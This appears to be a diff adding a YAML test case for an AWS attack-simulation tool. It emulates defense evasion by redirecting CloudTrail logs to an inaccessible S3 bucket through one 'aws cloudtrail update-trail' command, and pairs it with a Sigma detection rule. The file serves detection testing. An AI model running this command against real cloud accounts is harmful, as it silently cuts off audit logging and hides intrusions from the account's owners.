@@ -1,0 +1,37 @@
+---
+name: Cloudtrail change destination bucket
+author: Nick Jones
+description: |
+  Alter cloudtrail log destination to a bucket that target does not have access to
+platform: aws
+category: Defense Evasion
+mitre_ids:
+  - T1089
+permissions:
+  - cloudtrail:UpdateTrail
+input_arguments:
+  trailname:
+    description: Name of the cloudtrail to be targeted
+    type: str
+    value: "example-cloudtrail"
+  bucketname:
+    description: Name of S3 bucket to redirect logs to
+    type: str
+    value: "example-bucket"
+executors:
+  sh:
+    code: |
+      aws cloudtrail update-trail --name {{ trailname }} --s3-bucket-name {{ bucketname }}
+  leonidas_aws:
+    implemented: False
+    code: |
+      raise NotImplementedError
+detection:
+  sigma_id: 9be7e8b4-dd76-4396-b3ca-10c6d8df1048
+  status: experimental
+  level: low
+  sources:
+    - name: "cloudtrail"
+      attributes:
+        eventName: "UpdateTrail"
+        eventSource: "*.cloudtrail.amazonaws.com"
